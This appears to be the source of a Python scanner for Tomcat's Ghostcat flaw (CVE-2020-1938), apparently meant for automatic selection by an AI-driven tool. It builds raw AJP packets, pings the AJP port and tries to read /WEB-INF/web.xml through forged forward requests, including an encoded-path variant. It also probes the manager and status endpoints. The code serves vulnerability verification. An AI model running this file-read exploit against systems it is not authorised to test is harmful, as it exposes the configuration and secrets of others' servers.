"""
Ghostcat Scanner — AJP 포트 탐지 + CVE-2020-1938 검증
=======================================================
Apache Tomcat AJP(Apache JServ Protocol) 커넥터가 외부에 노출된 경우
Ghostcat 취약점(CVE-2020-1938)을 이용해 WEB-INF/web.xml 등 내부 파일 읽기 및
RCE 가능성을 검증한다.

기능:
  • AJP 포트(8009) 열림 여부 확인 (TCP connect)
  • AJPv13 CPing 요청 → CPong 응답 확인
  • WEB-INF/web.xml 읽기 시도 (Forward Request)
  • server-info / server-status 노출 여부
  • 결과 CRITICAL/HIGH 등급 분류

AI 자동 선택 조건:
  - Apache Tomcat 감지 시 자동 실행
  - Server 헤더에 "Tomcat" / "mod_jk" / "AJP" 포함 시
  - robots.txt 또는 에러 페이지에서 Tomcat 버전 노출 시

EN: AJP port detection and Ghostcat CVE-2020-1938 verification.
ZH: AJP端口检测和Ghostcat CVE-2020-1938漏洞验证。
"""
from __future__ import annotations

import socket
import struct
import re
import time
from dataclasses import dataclass, field
from urllib.parse import urlparse

import requests
import urllib3
urllib3.disable_warnings()


# ─────────────────────────────────────────────────────────────────────────────
# AJPv13 패킷 구성
# ─────────────────────────────────────────────────────────────────────────────

AJP_MAGIC_BYTES = b'\x12\x34'          # 웹서버 → Tomcat 방향
CPING_PACKET    = b'\x12\x34\x00\x01\x0a'  # CPing (type=0x0A)
CPONG_MAGIC     = b'\x41\x42\x00\x01\x09'  # CPong 응답 시작

AJP_FORWARD_REQUEST_TYPE = 0x02


def _ajp_string(s: str) -> bytes:
    """AJP string 인코딩: 2바이트 길이 + UTF-8 + NUL."""
    enc = s.encode("utf-8")
    return struct.pack(">H", len(enc)) + enc + b'\x00'


def _build_forward_request(method: int, url_path: str, host: str) -> bytes:
    """AJPv13 Forward Request 패킷 생성."""
    body = bytes([AJP_FORWARD_REQUEST_TYPE, method])
    body += _ajp_string("HTTP/1.1")     # protocol
    body += _ajp_string(url_path)       # req_uri
    body += _ajp_string("127.0.0.1")    # remote_addr
    body += _ajp_string("localhost")    # remote_host
    body += _ajp_string(host)           # server_name
    body += struct.pack(">H", 80)       # server_port
    body += b'\x00'                     # is_ssl = false
    body += struct.pack(">H", 2)        # num_headers = 2
    # Host 헤더
    body += struct.pack(">H", 0xa00e)   # 0xA00E = SC_REQ_HOST header code
    body += _ajp_string(host)
    # User-Agent 헤더
    body += struct.pack(">H", 0xa00f)   # 0xA00F = SC_REQ_USER_AGENT
    body += _ajp_string("bingo-ghostcat-scanner/1.0")
    body += b'\xff'                     # request_terminator

    packet = AJP_MAGIC_BYTES + struct.pack(">H", len(body)) + body
    return packet


# ─────────────────────────────────────────────────────────────────────────────
# 스캐너 결과 데이터클래스
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class GhostcatResult:
    target: str
    ajp_port_open: bool = False
    cpong_received: bool = False
    file_read_success: bool = False
    file_content: str = ""
    server_info_exposed: bool = False
    server_status_exposed: bool = False
    tomcat_version: str = ""
    severity: str = "INFO"
    findings: list[dict] = field(default_factory=list)
    error: str = ""


# ─────────────────────────────────────────────────────────────────────────────
# 핵심 스캔 함수
# ─────────────────────────────────────────────────────────────────────────────

def _check_ajp_port(host: str, port: int = 8009, timeout: float = 5.0) -> bool:
    """TCP connect로 AJP 포트 열림 확인."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False


def _send_cping(host: str, port: int = 8009, timeout: float = 5.0) -> bool:
    """CPing 전송 → CPong 응답 확인."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(CPING_PACKET)
            resp = s.recv(16)
            return resp[:5] == CPONG_MAGIC
    except Exception:
        return False


def _try_file_read(host: str, port: int, path: str, server_host: str, timeout: float = 8.0) -> str:
    """
    AJP Forward Request로 내부 파일 읽기 시도.
    Ghostcat은 req_uri에 WEB-INF 경로 지정으로 파일 읽기 가능.
    """
    # HTTP GET = 2
    pkt = _build_forward_request(2, path, server_host)
    try:
        with socket.create_connection((host, port), timeout=timeout) as s:
            s.sendall(pkt)
            chunks = []
            s.settimeout(timeout)
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    chunks.append(chunk)
                    if len(chunks) > 20:
                        break
                except socket.timeout:
                    break
            raw = b"".join(chunks)
            # AJP 응답에서 텍스트 페이로드 추출
            text = raw.decode("utf-8", errors="replace")
            # web.xml 특징적 패턴 확인
            if any(pat in text for pat in ["<web-app", "<servlet", "WEB-INF", "<?xml"]):
                return text[:2000]
            return ""
    except Exception:
        return ""


def _check_http_endpoints(base_url: str, session: requests.Session) -> dict:
    """server-info, server-status, manager 노출 여부 확인."""
    results = {}
    endpoints = [
        "/server-info",
        "/server-status",
        "/manager/html",
        "/host-manager/html",
        "/status",
    ]
    for ep in endpoints:
        try:
            r = session.get(base_url + ep, timeout=6)
            if r.status_code in (200, 401, 403):
                results[ep] = r.status_code
        except Exception:
            pass
    return results


def scan_ghostcat(target_url: str, ajp_port: int = 8009) -> GhostcatResult:
    """
    Ghostcat (CVE-2020-1938) 전체 스캔.

    EN: Full Ghostcat CVE-2020-1938 scan — AJP port check, CPing, file read attempt.
    ZH: Ghostcat CVE-2020-1938全面扫描——AJP端口检测、CPing、文件读取尝试。

    Args:
        target_url: 대상 URL (예: https://www.example.com)
        ajp_port:   AJP 포트 (기본 8009)
    Returns:
        GhostcatResult
    """
    parsed = urlparse(target_url)
    host = parsed.hostname or target_url
    result = GhostcatResult(target=target_url)

    sess = requests.Session()
    sess.verify = False
    sess.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) bingo-scanner"})

    # STEP 1 — HTTP로 Tomcat 감지
    try:
        r = sess.get(target_url, timeout=8)
        server = r.headers.get("Server", "") + r.headers.get("X-Powered-By", "")
        m = re.search(r"Tomcat/([\d.]+)", server + r.text, re.IGNORECASE)
        if m:
            result.tomcat_version = m.group(1)
    except Exception:
        pass

    # STEP 2 — AJP 포트 열림 확인
    result.ajp_port_open = _check_ajp_port(host, ajp_port)
    if not result.ajp_port_open:
        result.severity = "INFO"
        return result

    result.findings.append({
        "severity": "HIGH",
        "name": "AJP Port Exposed",
        "detail": f"AJP port {ajp_port} is open on {host}. Potential Ghostcat (CVE-2020-1938) attack surface.",
    })
    result.severity = "HIGH"

    # STEP 3 — CPing 확인 (서비스 활성 검증)
    result.cpong_received = _send_cping(host, ajp_port)
    if result.cpong_received:
        result.findings.append({
            "severity": "CRITICAL",
            "name": "Ghostcat CVE-2020-1938 — AJP Service Active",
            "detail": f"AJP CPing→CPong confirmed on {host}:{ajp_port}. Service is active and accepting AJP requests.",
        })
        result.severity = "CRITICAL"

    # STEP 4 — WEB-INF/web.xml 읽기 시도
    for path in ["/WEB-INF/web.xml", "/WEB-INF/web.XML", "/%57EB-INF/web.xml"]:
        content = _try_file_read(host, ajp_port, path, host)
        if content:
            result.file_read_success = True
            result.file_content = content
            result.findings.append({
                "severity": "CRITICAL",
                "name": f"Ghostcat — File Read Success: {path}",
                "detail": (
                    f"Successfully read {path} via AJP. "
                    f"Content preview: {content[:300]}"
                ),
            })
            result.severity = "CRITICAL"
            break

    # STEP 5 — HTTP 관리 엔드포인트 노출 확인
    exposed = _check_http_endpoints(target_url, sess)
    for ep, code in exposed.items():
        if ep in ("/server-info", "/server-status") and code == 200:
            result.server_info_exposed = True
            result.findings.append({
                "severity": "MEDIUM",
                "name": f"Management Endpoint Exposed: {ep}",
                "detail": f"{ep} returns HTTP {code} — Tomcat internals exposed.",
            })

    return result


def ghostcat_report(r: GhostcatResult) -> str:
    """Ghostcat 스캔 결과 보고서 생성."""
    lines = [
        f"[Ghostcat CVE-2020-1938] Target: {r.target}",
        f"  AJP Port Open   : {r.ajp_port_open}",
        f"  CPong Received  : {r.cpong_received}",
        f"  File Read       : {r.file_read_success}",
        f"  Tomcat Version  : {r.tomcat_version or 'unknown'}",
        f"  Severity        : {r.severity}",
    ]
    if r.findings:
        lines.append("  --- Findings ---")
        for f in r.findings:
            lines.append(f"  [{f['severity']}] {f['name']}")
            lines.append(f"           {f['detail'][:200]}")
    if r.file_content:
        lines.append("  --- web.xml Content (first 500 chars) ---")
        lines.append(r.file_content[:500])
    if not r.ajp_port_open:
        lines.append("  AJP port closed — not vulnerable to Ghostcat.")
    return "\n".join(lines)
